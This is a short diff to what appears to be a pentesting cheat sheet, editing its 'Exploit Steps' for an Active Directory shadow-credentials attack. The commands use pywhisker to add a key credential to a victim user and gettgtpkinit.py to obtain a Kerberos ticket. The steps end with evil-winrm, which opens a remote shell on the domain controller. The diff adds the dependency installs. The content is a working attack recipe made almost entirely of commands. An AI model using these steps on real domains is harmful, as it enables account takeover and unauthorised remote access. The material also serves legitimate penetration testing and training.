@@ -11,8 +11,10 @@
 
 #### Exploit Steps
 
-* `pywhisker --dc-ip <IP> -d <domain> -u <user> -p <pass> --target <victim-user> --action add`
+* `python3 pywhisker --dc-ip <IP> -d <domain> -u <user> -p <pass> --target <victim-user> --action add`&#x20;
+* `pip3 install -I git+https://github.com/wbond/oscrypto.git`
 * `python3 gettgtpkinit.py -cert-pfx ../file.pfx -pfx-pass '<pass>' -dc-ip <IP> <domain>/<victim-username> /tmp/<username>.ccache`&#x20;
+* `sudo apt-get install krb5-user -y`
 * `export KRB5CCNAME=/tmp/<username>.ccache`&#x20;
 * `klist`
 * `evil-winrm -i <DC-FQDN> -r <domain>`
